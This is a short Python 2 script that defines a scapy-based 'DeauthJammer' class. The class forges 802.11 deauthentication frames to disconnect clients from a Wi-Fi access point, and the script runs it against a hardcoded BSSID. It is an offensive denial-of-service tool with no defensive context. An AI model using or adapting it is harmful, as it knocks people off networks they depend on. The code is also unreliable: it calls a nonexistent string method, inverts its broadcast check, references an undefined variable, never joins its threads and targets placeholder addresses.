#! /usr/bin/env python

# We might just use this?
# https://gist.githubusercontent.com/raw/4576966/4591a64fcad42fe8aff239e3319e5949fef95d59/sniff-aps-complete.py

import threading
import atexit
import scapy.all as scapy


class DeauthJammer(object):

    def __init__(self, ap_bssid, ap_ssid=None):
        self._ap_ssid = ap_ssid
        self._ap_bssid = ap_bssid
        self._threads = []
        atexit.register(self._on_end)
        scapy.conf.verb = 0  # Non-verbose mode

    def jam(self, bssid, packet_count=1, targets=None):
        if not targets:
            return

        # scapy.conf.iface = SET INTERFACE

        for target in targets:
            jamThread = threading.Thread(target=self._deauth_target, args=(
                bssid, target, packet_count), kwargs={})
            self._threads.append(jamThread)
            jamThread.start()

    def _deauth_target(self, bssid, target, packet_count):
        broadcast = target.lowercase() != 'FF:FF:FF:FF:FF:FF'
        ap_to_client_pckt = scapy.Dot11(addr1=target, addr2=bssid,
                             addr3=bssid) / scapy.Dot11Deauth()
        client_to_ap_pckt = None
        if not broadcast:
            client_to_ap_pckt = scapy.Dot11(
                addr1=bssid, addr2=client, addr3=bssid) / scapy.Dot11Deauth()

        for n in range(packet_count):
            scapy.send(ap_to_client_pckt)

            if not broadcast:
                scapy.send(client_to_ap_pckt)

        print "Sent " + str(packet_count) + " packets to " + target

    def _on_end(self):
        for thread in self._threads:
            thread.join

# TODO Make sure we are on the right channel for this network
jammer = DeauthJammer("00:80:41:ae:fd:7e")
jammer.jam("SOME BSSID", packet_count=3, targets=["1", "2"])
